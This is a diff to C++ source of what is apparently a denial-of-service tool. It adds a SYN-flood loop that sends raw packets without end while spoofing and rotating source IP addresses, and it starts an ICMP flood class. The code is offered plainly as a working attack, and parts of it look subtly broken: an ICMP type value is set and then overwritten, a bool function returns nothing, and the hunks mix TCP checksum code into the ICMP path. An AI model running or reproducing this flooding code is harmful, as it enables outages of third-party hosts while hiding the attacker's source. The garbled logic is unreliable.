@@ -156,12 +156,52 @@ void SynFlood::generate()
     dst_addr.sin_addr.s_addr=iph_.daddr;
     dst_addr.sin_port = tcph_.dest;
 
+    struct iphdr * iph = (struct iphdr *)packet;
 
-    struct iphdr * iph;
-    iph = (struct iphdr *)packet;
+    while(power_)
+    {
+        //infinity send until power off
+        if(sendto(raw_fd_,packet,sizeof(packet),MSG_EOR,(struct sockaddr *)&dst_addr,(socklen_t)sizeof(dst_addr))<0)
+        {
+            std::cout<<"send to error! here's packet."<<std::endl;
+            printByHexData(packet,sizeof(packet));
+        }
+
+        //Auto Increase IP addr
+        if(!sender_ip_.inc_ip_addr())
+        {
+            //if reach at end of network addr(braodcast)
+            sender_ip_.set_rand_ip();
+
+        }
+        memcpy(&iph->saddr,sender_ip_.get_ip_ptr(),4);
+        calIPChecksum((uint8_t*)iph);
+        calTCPChecksum((uint8_t*)iph,sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions));
+    }
 
 
+}
 
+bool IcmpFlood::init_icmph()
+{
+    icmph_.type=8;
+    icmph_.type=0;
+    srand(time(NULL));
+    icmph_.un.echo.id = rand() % UINT16_MAX;
+
+}
+
+void IcmpFlood::generate()
+{
+    iph_.tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + ICMP_DATA_LEN);
+    //make packet buf
+    uint8_t packet[sizeof(struct iphdr) + sizeof(struct icmphdr) + ICMP_DATA_LEN];
+
+    sockaddr_in dst_addr;
+    dst_addr.sin_family=AF_INET;
+    dst_addr.sin_addr.s_addr=iph_.daddr;
+
+    struct iphdr * iph = (struct iphdr *)packet;
 
     while(power_)
     {
@@ -183,6 +223,5 @@ void SynFlood::generate()
         calIPChecksum((uint8_t*)iph);
         calTCPChecksum((uint8_t*)iph,sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(SynOptions));
     }
-
 
 }
